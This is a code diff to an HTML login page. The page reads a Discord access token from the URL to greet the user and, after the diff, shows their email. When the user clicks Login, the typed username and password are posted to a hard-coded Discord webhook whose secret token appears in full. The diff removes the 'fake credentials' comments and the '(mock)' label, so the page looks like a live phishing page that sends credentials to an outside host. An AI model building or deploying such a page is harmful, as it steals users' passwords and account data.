@@ -48,6 +48,7 @@
 
 <div class="login-box">
   <h2 id="greeting">Logging in...</h2>
+  <p id="email-display" style="font-size: 14px;"></p>
   <input type="text" id="username" placeholder="Username" />
   <input type="password" id="password" placeholder="Password" />
   <button onclick="sendToWebhook()">Login</button>
@@ -56,11 +57,9 @@
 <script>
   const webhookURL = "https://discord.com/api/webhooks/1359463177359855706/9r73rc7pZA-U2RgXAXgyDIBlivvoexHG5EtB6GYNrsb__lcfeRuTMwlEpXqTc-I2mQfz";
 
-  // Step 1: Get Access Token from URL Fragment
   const fragment = new URLSearchParams(window.location.hash.slice(1));
   const accessToken = fragment.get('access_token');
 
-  // Step 2: Fetch user info from Discord API
   if (accessToken) {
     fetch("https://discord.com/api/users/@me", {
       headers: {
@@ -70,12 +69,14 @@
     .then(res => res.json())
     .then(user => {
       document.getElementById('greeting').innerText = `Successfully logged in, ${user.username}#${user.discriminator}`;
+      if (user.email) {
+        document.getElementById('email-display').innerText = `Email: ${user.email}`;
+      }
     });
   } else {
     document.getElementById('greeting').innerText = `Not logged in via Discord`;
   }
 
-  // Step 3: Send fake credentials to Discord Webhook
   function sendToWebhook() {
     const fakeUser = document.getElementById('username').value;
     const fakePass = document.getElementById('password').value;
@@ -91,7 +92,7 @@
       },
       body: JSON.stringify(data)
     }).then(() => {
-      alert("Credentials sent (mock).");
+      alert("Credentials sent.");
     });
   }
 </script>
